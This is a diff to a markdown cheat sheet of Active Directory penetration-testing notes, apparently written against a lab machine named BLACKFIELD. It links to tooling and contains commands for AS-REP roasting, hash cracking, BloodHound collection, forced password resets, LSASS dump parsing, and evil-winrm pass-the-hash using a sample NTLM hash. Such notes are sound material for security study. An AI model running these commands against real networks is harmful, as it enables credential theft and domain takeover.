@@ -8,10 +8,10 @@ keywords: Internals
 ---
 
 # Initial Enumeration
-[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)
+**[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)**
   - Checks badpwdcount attribute only in the domain policy
 
-[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)
+**[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)**
 
 **Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
 ```
@@ -21,7 +21,7 @@ GetNPUsers.py BLACKFIELD/ -usersfile users.txt -format hashcat
 hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
 ```
 
-[LDAPSearch Cheat Sheet](https://notes.benheater.com/books/active-directory/page/ldapsearch)
+**[LDAPSearch Cheat Sheet](https://notes.benheater.com/books/active-directory/page/ldapsearch)**
 ```
 Domain Contexts: ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts
 Search Users: ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)'
@@ -30,18 +30,18 @@ Search Users: ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLAC
 Other resources
   - [Useful LDAP queries](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)
 
-[LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)
+**[LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)**
 
 Old tool however useful if Bloodhound.py isn't working as intended.
 
-[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)
+**[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)**
 
 Any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer.
 
 Additional Resources:
   - [ADIDNS Dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
 
-[BloodHound CE](https://github.com/SpecterOps/BloodHound)
+**[BloodHound CE](https://github.com/SpecterOps/BloodHound)**
 
 **Additional Resources** 
   - [BloodHound Community Edition](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose)
@@ -51,21 +51,25 @@ Additional Resources:
 curl -L https://ghst.ly/getbhce | docker compose -f - up
 ```
 
-[BloodHound.py for Linux](https://github.com/dirkjanm/BloodHound.py)
+**[BloodHound.py for Linux](https://github.com/dirkjanm/BloodHound.py)**
 ```
 python3 bloodhound.py -u "support" -p "#00^BlackKnight" -c ALL -d BLACKFIELD.local -ns 10.10.10.192 -dc dc01.BLACKFIELD.local
 ```
 
+# Poisoning and Relay
+**[Responder](https://github.com/lgandx/Responder)**
+  - IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay.
+
 # Active Directory Exploitation
-[ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
+**[ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)**
 
-[WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)
+**[WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)**
 
-[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
+**[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)**
 
-[NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
+**[NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)**
 
-[DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
+**[DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)**
 
 **With PowerView**:
 ```
@@ -78,9 +82,9 @@ Get-DomainUser -Identity svc-alfresco
 Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
 ```
 
-[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)
+**[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)**
 
-[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
+**[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)**
 
 **Requires:** Domain Credentials
 
@@ -101,7 +105,7 @@ net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts n
 ```
 
 ## Credential Dumping
-[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)
+**[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)**
 
 **Requires:** Credential Guard to be disabled.
 
@@ -109,7 +113,7 @@ net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts n
 Dumping LSASS via Linux: https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d
 ```
 
-[Pypykatz - Mimikatz for Linux](https://github.com/skelsec/pypykatz)
+**[Pypykatz - Mimikatz for Linux](https://github.com/skelsec/pypykatz)**
 
 **Requires:** A DMP file containing credentials extracted to our Linux machine.
 ```
@@ -117,7 +121,7 @@ pypykatz lsa minidump lsass.DMP
 ```
 
 ## Domain Escalation
-[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)
+**[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)**
 ```
 whoami /all (SeBackupPrivilege Enabled)
 
@@ -132,14 +136,14 @@ https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb96
 -----------------------------------------------------------------------
 
 ## Active Directory Tools
-[NetExec](https://github.com/Pennyw0rth/NetExec)
+**[NetExec](https://github.com/Pennyw0rth/NetExec)**
 ```
 curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
 source $HOME/.cargo/env
 pipx install git+https://github.com/Pennyw0rth/NetExec
 ```
 
-[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
+**[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**
 ```. .\powerview.ps1```
 
 **NSE**
@@ -150,16 +154,16 @@ Enum4Linux
 SMBMap
 smbclient
 smbclient.py (Impacket)
-[NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)
-[SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)
+**[NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)**
+**[SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**
 
 **WinRM**
-[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
+**[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)**
 ```
 evil-winrm -i 10.10.10.192 -u "svc_backup" -H "9658d1d1dcd9250115e2205d9f48400d"
 ```
 
-[Impacket]()
+**[Impacket]()**
 ```
 python3 -m pipx install impacket
   - **PSExec**
